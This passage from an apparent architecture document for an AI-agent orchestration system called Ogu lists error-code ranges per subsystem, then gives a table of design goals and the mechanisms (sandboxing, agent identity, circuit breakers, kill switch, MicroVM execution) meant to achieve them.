| OGU3701-3799 | Feature Lifecycle v2 (Closure 2) |
| OGU3801-3899 | Feature Isolation (Closure 3) |
| OGU3901-3999 | Agent Identity (Closure 4) |
| OGU4001-4099 | KadimaAdapter (Enhancement 1) |
| OGU4101-4199 | Circuit Breakers (Closure 7) |
| OGU4201-4299 | System Halt/Resume (Closure 7) |
| OGU4301-4399 | Semantic Lock & AST Merge (Closure 9) |
| OGU4401-4499 | Knowledge Graph & RAG (Closure 10) |
| OGU4501-4599 | Functional Determinism (Closure 11) |
| OGU4601-4699 | MicroVM Execution (Closure 12) |
| OGU5001-5099 | Runner Execution (Topology 1) |
| OGU5101-5199 | File Locks (Topology 2) |
| OGU5201-5299 | Runner Pool (Topology 3) |
| OGU5301-5399 | Kadima Daemon (Topology 4) |
| OGU5401-5499 | IPC Protocol (Topology 3) |
| OGU5501-5599 | Task Queue (Topology 5) |
| OGU5601-5699 | Remote Runners (Milestone 3) |

---

## Design Goals (from Vision) — Final Status

| Goal | How It's Achieved |
|---|---|
| Model agnostic | Capability Registry (Fix 6) + Canary Routing (Stone 4) — swap providers live |
| Deterministic | Policy AST with versioned hash chain (Closure 1) + Execution Snapshot (Fix 3) + Replay:full (Stone 3) |
| Auditable | JSONL audit (Phase 3) + Attestation chain (Stone 3) + Override records (Fix 5) + Agent identity audit (Closure 4) |
| Replaceable | Capability abstraction + Runner contract (Stone 6) — every layer pluggable |
| Local-first | All state in `.ogu/` files. Runner local = default |
| Cloud-ready | Runner remote (Stone 6) + Storage adapter + Agent remote auth (Closure 4) |
| Self-improving | Performance Index (Fix 7) + Org Evolution (Stone 5) — system learns AND adapts |
| Secure | Sandbox hermetic (Stone 2) + SecretBroker + Agent revocation + quarantine (Closure 4) |
| Governance | Policy AST + deterministic evaluation pipeline + conflict resolution (Closure 1) — not just rules as data, but formal language |
| Provable | Attestation chain (Stone 3) + Reproducible builds + Company Snapshot (Enhancement 2) — full org-level proof |
| Isolated | Feature Isolation (Closure 3) — budget, concurrency, blast radius, failure containment per feature |
| Identifiable | Agent Identity Contract (Closure 4) — every action traceable to agentId + session + credential |
| Resilient | Chaos Injection (Enhancement 3) — failure containment proven, not assumed |
| Formally bounded | KadimaAdapter (Enhancement 1) — no boundary erosion, static analysis enforcement |
| Consistent | Transaction boundaries (Closure 5) — atomic units, commit order, compensating rollback, idempotency |
| Fair | Formal Scheduler (Closure 6) — WFQ, starvation prevention, preemption, team/feature quotas |
| Resilient | Failure Domains (Closure 7) — circuit breakers, provider failover, global kill switch, degraded modes |
| Measurable | Metrics Layer (Closure 8) — Org Health Score, KPIs, SLAs, regression detection |
| Freezable | Company Freeze (Enhancement 6) — audit-only mode, graceful checkpoint, CTO-gated |
| Verifiable | Execution Graph Hash (Enhancement 4) + Deterministic Mode (Enhancement 5) — formal proof of correctness |
| Merge-safe | Semantic Mutex + AST Merge (Closure 9) — parallel agents never break each other's code |
| Amnesia-proof | Semantic Memory Fabric (Closure 10) — knowledge graph + RAG, corporate brain grows forever |
| Drift-tolerant | Functional Determinism (Closure 11) — AST-hash, not text-hash. L0-L4 equivalence levels, auto-healing |
| Hardened | MicroVM Execution (Closure 12) — ephemeral VMs, zero kernel sharing, egress proxy, artifact validation |
| Runnable | Physical Architecture (Iteration 7) — 3 daemons + CLI, defined ports, startup/shutdown, IPC protocol |
| Scalable | Milestone 1→2→3 rollout — monolithic CLI → background daemon → distributed runners |
| Observable | Studio event stream + Kadima health endpoint + Prometheus metrics — full system visibility |
| Bootstrappable | Week-by-week build plan — contracts first, CLI second, daemon third, runners last |
| 5-10 year horizon | 8 fixes + 6 stones + 12 closures + 6 enhancements + physical topology = production-grade OS |
